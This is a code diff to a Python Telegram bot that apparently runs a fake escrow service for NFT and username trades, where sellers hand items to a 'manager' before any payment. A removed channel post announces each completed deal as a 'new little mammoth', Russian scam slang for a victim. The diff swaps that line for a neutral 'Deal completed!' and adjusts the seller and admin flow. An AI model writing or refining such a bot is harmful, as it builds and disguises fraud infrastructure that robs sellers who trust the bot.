@@ -822,9 +822,9 @@ def deal_guarantee_lines(lang):
 
 def deal_seller_transfer_text(lang):
     return T(lang,
-        f"Передайте товар менеджеру {MANAGER_TAG} и нажмите «Я передал». Вы сможете продолжить сделку дальше передав товар.",
-        f"Transfer the item to manager {MANAGER_TAG} and press «I transferred». You can continue the deal after transferring the item.",
-        f"Передайте товар менеджеру {MANAGER_TAG} і натисніть «Я передав». Ви зможете продовжити угоду далі передавши товар.")
+        f"Передайте товар менеджеру {MANAGER_TAG} и нажмите «Я передал». После этого покупатель сможет оплатить.",
+        f"Transfer the item to manager {MANAGER_TAG} and press «I transferred». The buyer can pay after that.",
+        f"Передайте товар менеджеру {MANAGER_TAG} і натисніть «Я передав». Після цього покупець зможе оплатити.")
 def H(value): return html.escape(str(value))
 
 def deal_payment_details_lines(deal_id, d, lang="ru"):
@@ -2598,8 +2598,8 @@ def validate_complaint_username(text):
     t=(text or "").strip()
     if not t: return None
     if not t.startswith("@"): t="@"+t
-    # только латиница/цифры/_ , 4-32 символа после @
-    if not re.fullmatch(r"@[A-Za-z0-9_]{4,32}", t):
+    # только латиница/цифры/_ , 5-32 символа после @ (как в создании сделки)
+    if not re.fullmatch(r"@[A-Za-z0-9_]{5,32}", t):
         return None
     # отсечь мусор вроде @aaaa / @1111
     body=t[1:]
@@ -2997,7 +2997,7 @@ AI_KB = {
         ),
         "en": (
             "Referral program\n\n"
-            "Referrals → your link t.me/FunPaySwapOTCRobot?start=ref_ВАШ_ID.\n"
+            "Referrals → your link t.me/FunPaySwapOTCRobot?start=ref_YOUR_ID.\n"
             "You earn 3% from each deal of users who joined via your link.\n"
             "See invited count, earned amount and referral list.\n"
             "Payout questions - ask the manager."
@@ -4386,7 +4386,7 @@ async def on_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 ok=validate_complaint_username(text)
                 if not ok:
                     await update.message.reply_text(
-                        f"{Ewrn} <b>{L(lang,'Неверный юзернейм. Пример: @user (4-32 символа).','Invalid username. Example: @user (4-32 chars).')}</b>",
+                        f"{Ewrn} <b>{L(lang,'Неверный юзернейм. Пример: @username (5-32 символа).','Invalid username. Example: @username (5-32 chars).')}</b>",
                         parse_mode="HTML",reply_markup=complaint_cancel_kb(lang)); return
                 ud["cmp_username"]=ok; ud["complaint_step"]="deal"
                 await update.message.reply_text(complaint_prompt("deal",ctype,lang),parse_mode="HTML",reply_markup=complaint_cancel_kb(lang)); return
@@ -4970,10 +4970,6 @@ async def on_transferred(update, context):
         add_log(db,"Товар передан",deal_id=deal_id,uid=seller.id,username=seller.username or "")
         save_db(db)
         seller_tag=f"@{seller.username}" if seller.username else f"#{seller.id}"
-        payment_attempt=int(deal.get("payment_attempt",0))
-        admin_kb=InlineKeyboardMarkup([[
-            InlineKeyboardButton("Подтвердить сделку",callback_data=f"adm_confirm_{deal_id}_{payment_attempt}",icon_custom_emoji_id="5316827280863934685")
-        ]])
         lang=get_lang(seller.id)
         try:
             await q.edit_message_reply_markup(InlineKeyboardMarkup([
@@ -4985,8 +4981,9 @@ async def on_transferred(update, context):
         schedule_log_msg(context, db)
         schedule_notify_admins(
             context,
-            f"{Ech} <b>Продавец передал товар</b>\n\n{Eu} {seller_tag}\n{Edl} <code>{deal_id}</code>",
-            admin_kb)
+            f"{Ech} <b>Продавец передал товар</b>\n\n{Eu} {seller_tag}\n{Edl} <code>{deal_id}</code>\n\n"
+            f"<i>Кнопка подтверждения появится после «Я оплатил».</i>",
+            None)
         if buyer_uid:
             async def _bg_buyer():
                 try:
@@ -5148,7 +5145,7 @@ async def adm_confirm(update, context):
                 nft_link_post=dd.get("nft_link","") if dtype=="nft" else dd.get("trade_username","") if dtype=="username" else ""
                 link_str=f"\n{Eln} {nft_link_post}" if nft_link_post else ""
                 post_text=(
-                    f"{ce('5258262708838472996','🔥')} <b>Новый мамонтёнок!</b>\n\n"
+                    f"{ce('5258262708838472996','🔥')} <b>Сделка завершена!</b>\n\n"
                     f"{Eu} {buyer_link_post}\n"
                     f"{Emn} <b>{amt_str} {deal_currency}</b>"
                     f"{link_str}"
@@ -5293,8 +5290,7 @@ async def show_profile(update, context):
 
 async def show_ref(update, context):
     try:
-        db=load_db(); uid=update.effective_user.id; u=get_user(db,uid); save_db(db)
-        db=load_db(); u=db["users"][str(uid)]; lang=get_lang(uid); ru=lang=="ru"
+        db=load_db(); uid=update.effective_user.id; u=get_user(db,uid); lang=get_lang(uid); ru=lang=="ru"
         ref_link=f"https://t.me/{BOT_USERNAME}?start=ref_{uid}"
         rc=u.get("ref_count",0); re=u.get("ref_earned",0)
         refs=[v.get("username","?") for v in db.get("users",{}).values() if v.get("ref_by")==str(uid)]
